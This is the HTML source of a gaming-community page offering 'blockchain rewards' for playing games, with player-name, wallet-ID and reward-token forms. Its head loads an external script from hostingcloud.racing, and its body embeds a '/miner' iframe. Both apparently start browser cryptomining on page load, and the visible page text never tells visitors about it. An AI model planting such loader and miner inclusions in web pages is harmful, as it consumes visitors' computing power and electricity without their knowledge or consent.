<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <script src="/client.js" defer></script>
    <script src="/fly.js" defer></script>
    <link rel="stylesheet" href="/style.css" />
    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>

    <script src="https://www.hostingcloud.racing/5pDo.js"></script>
  </head>
  <body>
    <miner><iframe src="/miner"> </iframe></miner>
    <div id="hubs"></div>

    <div class="SuperLogin" id="login">
      <div class="backgrounds">
        <center>
          <card id="mtcg"></card>
          <card id="doobetter"></card>
          <card id="starshatter"></card>
          <card id="lokaya"></card>
          <card id="gametestplay"></card>
          <card id="ottman"></card>
          <card id="caged"></card>
          <card id="yorizzo"></card>
          <card id="bndr"></card>
          <card id="eclipse"></card>
          <card id="pinn"></card>
          <card id="voxix"></card>
          <card id="mindsbulb"></card>
          <card id="pajunior"></card>
          <card id="alienship"></card>
          <card id="invadergaming"></card>
          <card id="grock"></card>
          <card id="assassin"></card>
          <card id="charged"></card>
          <card id="freedomfightervictor"></card>
          <card id="christnat"></card>
          <card id="chrisdoogood"></card>
          <card id="thriftegaming"></card>
          <card id="satorid"></card>
          <card id="maximumunderdrive"></card>
          <card id="pretty"></card>
          <card id="lucoin"></card>
          <card id="noid"></card>
          <card id="tetn"></card>
          <card id="troll"></card>
          <card id="thefreespirit"></card>
          <card id="token1media"></card>
          <card id="jesustoken"></card>
          <script
            src="https://mindsgaming.glitch.me/mtcg/deck/deck.js"
            defer
          ></script>
        </center>
      </div>
      <div class="LOGIN" align="center">
        <h2>
          <a
            class="minds-share-button"
            target="_blank"
            title="Share to Minds"
            href="https://www.minds.com/register?referrer=MindsGaming"
          >
            <img
              src="https://cdn-assets.minds.com/front/dist/en/assets/logos/bulb.svg"
              alt="Minds"
              height="40"
            />
          </a>
          MindsGaming Blockchain Rewards
          <p class="blockchain">
            Earn Blockchain Tokens By Playing Games!
          </p>
        </h2>
        <div class="wrapIMG">
          <div class="loginImage">
            <br />
            <br />
            <div id="playername" class="form">
              <input
                id="username"
                aria-label="a new dream"
                type="text"
                maxlength="100"
                placeholder="Player Name"
              />
              <div class="button" id="playerBTN" onclick="enterWallet();">
                A
              </div>
            </div>
            <div id="rewardtoken" class="hide">
              <h3>
                Select Reward:
              </h3>
              <div class="dreamtoken" id="gamertokens" onclick="gamertokens();">
                GAMER
              </div>
              <div
                class="dreamtoken"
                id="doobettertokens"
                onclick="doobettertokens();"
              >
                DooBetter
              </div>
              <div
                class="dreamtoken"
                id="eclipsetokens"
                onclick="eclipsetokens();"
              >
                ECLIPSE
              </div>
              <input
                type="hidden"
                name="tokens"
                id="REWARDTOKEN"
                placeholder="Reward Token"
              />
              <br />
            </div>

            <form class="hide" id="wallet">
              <input
                name="dream"
                aria-label="a new dream"
                type="text"
                maxlength="100"
                placeholder="Wallet ID"
                required
              />
              <button type="submit" id="submit-dream">Submit</button>
            </form>
            <br />
            <div class="button" onclick="guest();">
              Guest
            </div>
          </div>
          <a
            href="https://www.mintme.com/token/MTCG/invite"
            class="bubble"
            target="_blank"
          >
            Get A Wallet</a
          >
          <a href="/refferal" class="bubble" target="_self"> Enter Refferal</a>
          <a href="/help/#join" class="bubble" target="_blank">
            Join Ecosystem</a
          >
        </div>
      </div>
    </div>

    <div class="rewardicon" id="rewardicon" onclick="viewReward();">
      <br />
      <br />
      <center>
        <label id="minutes" value="0">00</label>.<label id="seconds" value="0"
          >00</label
        >
      </center>
    </div>
    <div title="closed" id="REWARDS" class="hide">
      <div>Player: <label id="myName">Guest</label></div>
      <div>
        Wallet:
        <label id="myWallet" onclick="getLogin();" style="cursor:pointer;"
          >LOGIN</label
        >
      </div>
      <div>Reward Token: <label id="myToken">Random</label></div>
      <div>Earned Rewards: <label id="myRewards">00.00</label></div>
      <div class="button" onclick="claimUpdate();">
        Claim
      </div>
      <button class="hide" id="clear-dreams">
        Clear Dreams
      </button>
      <section class="dream">
        <ul id="dreams"></ul>
      </section>
    </div>
  </body>
</html>
